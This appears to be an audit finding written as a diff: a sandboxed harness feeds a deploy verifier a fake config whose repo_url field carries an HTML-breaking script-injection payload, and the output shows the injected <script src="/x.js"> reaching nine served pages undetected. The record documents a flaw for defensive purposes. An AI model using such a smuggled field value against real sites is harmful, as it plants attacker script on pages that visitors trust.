@@ -1,0 +1,20 @@
+# check-01: tools/verify-deploy.py rebuilds with placeholder values taken from the verified deployment
+# command (from the audit root):
+bash bin/sbx.sh h-release 300 -- python3 -I /scratch/harness-01.py
+# sandbox: bwrap --unshare-all (no network), target read-only at /target, env -i allowlist, prlimit as=4GiB cpu=300s fsize=64MiB nofile=256 nproc=512
+# input: fake /api/v1/config = {"network":"esmeralda","repo_url":"https://github.com/c7b/hidebox\"><script src=\"/x.js\"></script><a hidden href=\"","security_drop":null}; all fetches answered from an in-process dict (harness-01.py), no sockets
+# harness source: harness-01.py (same artifacts dir)
+# exit status: 0
+# ---- output ----
+--- derived mutis.toml used by verify-deploy:
+public_origin = "https://hidebox.example"
+network = "esmeralda"
+security_drop_url = ""
+repo_url = "https://github.com/c7b/hidebox\"><script src=\"/x.js\"></script><a hidden href=\""
+
+build rc 0 build: OK {"content_id": "a4427680", "files": 213, "git_sha": "0000000000000000000000000000000000000000", "holding": false, "origin": "https://hidebox.example", "pages": 7, "vendored_checked": 6, "version": "fixture"} 
+build rc 0 build: OK {"content_id": "a4427680", "files": 213, "git_sha": "0000000000000000000000000000000000000000", "holding": false, "origin": "https://hidebox.example", "pages": 7, "vendored_checked": 6, "version": "fixture"} 
+--- verify-deploy compare() differences: 0 []
+--- served /index.html header link: <a class="gh" href="https://github.com/c7b/hidebox"><script src="/x.js"></script><a hidden href="" aria-label="Source code on GitHub"><svg class="icon" focusable="false" aria-hidde
+--- injected <script src="/x.js"> pages: ['/404.html', '/app/app.html', '/app/view.html', '/fine-print/index.html', '/how/index.html', '/index.html', '/judges/index.html', '/made/index.html', '/v2/index.html']
+--- x.js in manifest files: False ; /x.js fetched by verifier: False
